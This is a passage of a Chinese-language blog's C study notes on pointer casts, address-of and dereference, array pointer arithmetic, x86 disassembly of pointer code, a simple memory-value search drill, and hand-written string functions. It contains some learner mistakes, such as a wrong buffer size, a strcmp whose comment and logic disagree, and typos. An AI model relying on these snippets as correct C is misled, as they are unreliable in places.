s;</span><br><span class=\"line\">int m = 10;</span><br><span class=\"line\">s = (Student)x;    //不能转，int不能和结构体类型互相转换</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int* x;</span><br><span class=\"line\">Student* y;</span><br><span class=\"line\">x = (int*) 10;</span><br><span class=\"line\">y = (Student*)x;    //可以转</span><br><span class=\"line\"></span><br><span class=\"line\">int* x;</span><br><span class=\"line\">Student y;</span><br><span class=\"line\">x = (Studnet*)y;   //不能转</span><br><span class=\"line\"></span><br><span class=\"line\">&amp;是地址符，类型是其后面的类型加一个“*”，任何变量都可以使用来获取地址，但不能用在常量上。</span><br><span class=\"line\">&amp;可以取任何一个变量的地址</span><br><span class=\"line\">&amp;a 的类型是a的类型+*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char***** a = (char*****)10;</span><br><span class=\"line\">&amp;a = char******</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125132226542.png\" alt=\"image-20230125132226542\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125133522040.png\" alt=\"image-20230125133522040\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230221165556550.png\" alt=\"image-20230221165556550\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span>  x=<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>* px = &amp;x;</span><br><span class=\"line\"><span class=\"type\">char</span> x1 = *px;</span><br><span class=\"line\">*x == x的类型减去一个*</span><br><span class=\"line\"></span><br><span class=\"line\">变量类型本来带*才能加*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">5</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;;   <span class=\"comment\">//开辟8个字节缓冲区</span></span><br><span class=\"line\"><span class=\"type\">int</span>* x = &amp;arr[<span class=\"number\">0</span>];   <span class=\"comment\">//第一个变量的地址</span></span><br><span class=\"line\"><span class=\"type\">int</span>* px = arr;      <span class=\"comment\">//两种等价的写法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span>;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,arr[i]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,*(px+i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//px是int*类型，运算时去掉一个*,变为int类型，偏移时每次+4找到数组中对应位置，*在解引用</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a = 10;</span><br><span class=\"line\">\tshort b = 20;</span><br><span class=\"line\">\tint c = 30;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchar* pa = &amp;a;</span><br><span class=\"line\">\tshort* pb = &amp;b;</span><br><span class=\"line\">\tint* pc = &amp;c;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchar** ppa = &amp;pa;</span><br><span class=\"line\">\tshort** ppb = &amp;pb;</span><br><span class=\"line\">\tint** ppc = &amp;pc;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D740 55                   push        ebp</span><br><span class=\"line\">0040D741 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D743 83 EC 64             sub         esp,64h</span><br><span class=\"line\">0040D746 53                   push        ebx</span><br><span class=\"line\">0040D747 56                   push        esi</span><br><span class=\"line\">0040D748 57                   push        edi</span><br><span class=\"line\">0040D749 8D 7D 9C             lea         edi,[ebp-64h]</span><br><span class=\"line\">0040D74C B9 19 00 00 00       mov         ecx,19h</span><br><span class=\"line\">0040D751 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">0040D756 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"></span><br><span class=\"line\">0040D758 C6 45 FC 0A          mov         byte ptr [ebp-4],0Ah</span><br><span class=\"line\">0040D75C 66 C7 45 F8 14 00    mov         word ptr [ebp-8],offset func3+20h (0040d760)</span><br><span class=\"line\">0040D762 C7 45 F4 1E 00 00 00 mov         dword ptr [ebp-0Ch],1Eh</span><br><span class=\"line\">0040D769 8D 45 FC             lea         eax,[ebp-4]</span><br><span class=\"line\">0040D76C 89 45 F0             mov         dword ptr [ebp-10h],eax</span><br><span class=\"line\">0040D76F 8D 4D F8             lea         ecx,[ebp-8]</span><br><span class=\"line\">0040D772 89 4D EC             mov         dword ptr [ebp-14h],ecx</span><br><span class=\"line\">0040D775 8D 55 F4             lea         edx,[ebp-0Ch]</span><br><span class=\"line\">0040D778 89 55 E8             mov         dword ptr [ebp-18h],edx</span><br><span class=\"line\">0040D77B 8D 45 F0             lea         eax,[ebp-10h]</span><br><span class=\"line\">0040D77E 89 45 E4             mov         dword ptr [ebp-1Ch],eax</span><br><span class=\"line\">0040D781 8D 4D EC             lea         ecx,[ebp-14h]</span><br><span class=\"line\">0040D784 89 4D E0             mov         dword ptr [ebp-20h],ecx</span><br><span class=\"line\">0040D787 8D 55 E8             lea         edx,[ebp-18h]</span><br><span class=\"line\">0040D78A 89 55 DC             mov         dword ptr [ebp-24h],edx</span><br><span class=\"line\">0040D78D 5F                   pop         edi</span><br><span class=\"line\">0040D78E 5E                   pop         esi</span><br><span class=\"line\">0040D78F 5B                   pop         ebx</span><br><span class=\"line\">0040D790 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040D792 5D                   pop         ebp</span><br><span class=\"line\">0040D793 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void func4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint p = 10;</span><br><span class=\"line\">\tint******* p7;</span><br><span class=\"line\">\tint****** p6;</span><br><span class=\"line\">\tint***** p5;</span><br><span class=\"line\">\tint**** p4;</span><br><span class=\"line\">\tint*** p3;</span><br><span class=\"line\">\tint** p2;</span><br><span class=\"line\">\tint* p1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tp1 = &amp;p;</span><br><span class=\"line\">\tp2 = &amp;p1;</span><br><span class=\"line\">\tp3 = &amp;p2;</span><br><span class=\"line\">\tp4 = &amp;p3;</span><br><span class=\"line\">\tp5 = &amp;p4;</span><br><span class=\"line\">\tp6 = &amp;p5;</span><br><span class=\"line\">\tp7 = &amp;p6;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0040D870 55                   push        ebp</span><br><span class=\"line\">0040D871 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D873 83 EC 60             sub         esp,60h</span><br><span class=\"line\">0040D876 53                   push        ebx</span><br><span class=\"line\">0040D877 56                   push        esi</span><br><span class=\"line\">0040D878 57                   push        edi</span><br><span class=\"line\">0040D879 8D 7D A0             lea         edi,[ebp-60h]</span><br><span class=\"line\">0040D87C B9 18 00 00 00       mov         ecx,18h</span><br><span class=\"line\">0040D881 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">0040D886 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"></span><br><span class=\"line\">0040D888 C7 45 FC 0A 00 00 00 mov         dword ptr [ebp-4],0Ah</span><br><span class=\"line\">0040D88F 8D 45 FC             lea         eax,[ebp-4]</span><br><span class=\"line\">0040D892 89 45 E0             mov         dword ptr [ebp-20h],eax</span><br><span class=\"line\">0040D895 8D 4D E0             lea         ecx,[ebp-20h]</span><br><span class=\"line\">0040D898 89 4D E4             mov         dword ptr [ebp-1Ch],ecx</span><br><span class=\"line\">0040D89B 8D 55 E4             lea         edx,[ebp-1Ch]</span><br><span class=\"line\">0040D89E 89 55 E8             mov         dword ptr [ebp-18h],edx</span><br><span class=\"line\">0040D8A1 8D 45 E8             lea         eax,[ebp-18h]</span><br><span class=\"line\">0040D8A4 89 45 EC             mov         dword ptr [ebp-14h],eax</span><br><span class=\"line\">0040D8A7 8D 4D EC             lea         ecx,[ebp-14h]</span><br><span class=\"line\">0040D8AA 89 4D F0             mov         dword ptr [ebp-10h],ecx</span><br><span class=\"line\">0040D8AD 8D 55 F0             lea         edx,[ebp-10h]</span><br><span class=\"line\">0040D8B0 89 55 F4             mov         dword ptr [ebp-0Ch],edx</span><br><span class=\"line\">0040D8B3 8D 45 F4             lea         eax,[ebp-0Ch]</span><br><span class=\"line\">0040D8B6 89 45 F8             mov         dword ptr [ebp-8],eax</span><br><span class=\"line\">0040D8B9 5F                   pop         edi</span><br><span class=\"line\">0040D8BA 5E                   pop         esi</span><br><span class=\"line\">0040D8BB 5B                   pop         ebx</span><br><span class=\"line\">0040D8BC 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040D8BE 5D                   pop         ebp</span><br><span class=\"line\">0040D8BF C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void fun()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[5] = &#123;1,2,3,4,5&#125;;</span><br><span class=\"line\">\tfor (int k = 0;k&lt;5;k++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t*(arr+k) = 5 - k;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfor (int i = 0;i&lt;5;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,*(arr+i));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230126121202168.png\" alt=\"image-20230126121202168\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char arr[] = &#123;</span><br><span class=\"line\">\t0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,</span><br><span class=\"line\">\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,</span><br><span class=\"line\">\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,</span><br><span class=\"line\">\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0x0A,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,</span><br><span class=\"line\">\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,</span><br><span class=\"line\">\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,</span><br><span class=\"line\">\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void FindBloodAddr()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = 0, length = sizeof(arr)/sizeof(arr[0]);</span><br><span class=\"line\">\twhile(i&lt;length - 4)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint* p = (int*)(arr+i);</span><br><span class=\"line\">\t\tif(*p == 0x64)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;[%X] = %d\\n&quot;,p,*p);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFindBloodAddr();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void FindNum()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar* add = data;   </span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%X\\n&quot;,add);</span><br><span class=\"line\">\tfor(int i=0; i&lt;sizeof(data)/sizeof(char)-4; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//*(add+i)</span><br><span class=\"line\">\t\tif(*(int*)(add+i) == 0x64)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;%d\\n&quot;,i);</span><br><span class=\"line\">\t\t\tprintf(&quot;[%X]=%d\\n&quot;, (int*)(add+i), *(int*)(add+i));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> names[] = <span class=\"string\">&quot;ABCDE&quot;</span>;</span><br><span class=\"line\">==</span><br><span class=\"line\"><span class=\"type\">char</span> arr[<span class=\"number\">6</span>] = &#123;<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;0&#x27;</span>&#125;;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,arr )</span><br><span class=\"line\"></span><br><span class=\"line\">代码区</span><br><span class=\"line\">堆栈区</span><br><span class=\"line\">全局变量区 - 可读可写</span><br><span class=\"line\">常量区 - 可读不可写</span><br><span class=\"line\">    </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">char</span>* x = <span class=\"string\">&quot;China&quot;</span>;   <span class=\"comment\">//char*指向的字符串不能改，因为存储在常量区，char*的地址可以改</span></span><br><span class=\"line\"><span class=\"type\">char</span> y[] = <span class=\"string\">&quot;China&quot;</span>;  <span class=\"comment\">//全局区</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t*(x+<span class=\"number\">1</span>) = <span class=\"string\">&quot;A&quot;</span>;    <span class=\"comment\">//不能修改常量区 0xC0000005</span></span><br><span class=\"line\">    x = <span class=\"string\">&quot;abx&quot;</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\ty[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;A&#x27;</span>;    <span class=\"comment\">//常量区的内容复制到局部变量中</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* x = <span class=\"string\">&quot;China&quot;</span>;     <span class=\"comment\">//china在常量区，x是china在常量区的首地址 </span></span><br><span class=\"line\">\t<span class=\"type\">char</span> y[] = <span class=\"string\">&quot;China&quot;</span>;    <span class=\"comment\">//china在常量区，被拷贝到栈中</span></span><br><span class=\"line\">\t*(x+<span class=\"number\">1</span>) = <span class=\"string\">&quot;A&quot;</span>;          <span class=\"comment\">//0xC0000005</span></span><br><span class=\"line\">\t  </span><br><span class=\"line\">\ty[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;A&#x27;</span>;   \t\t   <span class=\"comment\">//修改栈中数据</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strlen</span><span class=\"params\">(<span class=\"type\">char</span>* s)</span>   <span class=\"comment\">//返回值是s的长度，不包括\\0</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">\t<span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*(s) != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        ret++;</span><br><span class=\"line\">        s++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcpy</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* ret = dest;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*(dest++) = *(src)++);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span class=\"title\">strcat</span><span class=\"params\">(<span class=\"type\">char</span>* dest, <span class=\"type\">char</span>* src)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* ret = dest;</span><br><span class=\"line\"> \t<span class=\"keyword\">while</span>(*dest != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        dest++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*dest++ = *src++);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">strcmp</span><span class=\"params\">(<span class=\"type\">char</span>*s1, <span class=\"type\">char</span>* s2)</span> <span class=\"comment\">//一样返回0，不一样返回1</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*s1!=<span class=\"number\">0</span> &amp;&amp; *s2!=<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*s1++ != *s2++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span>* <span 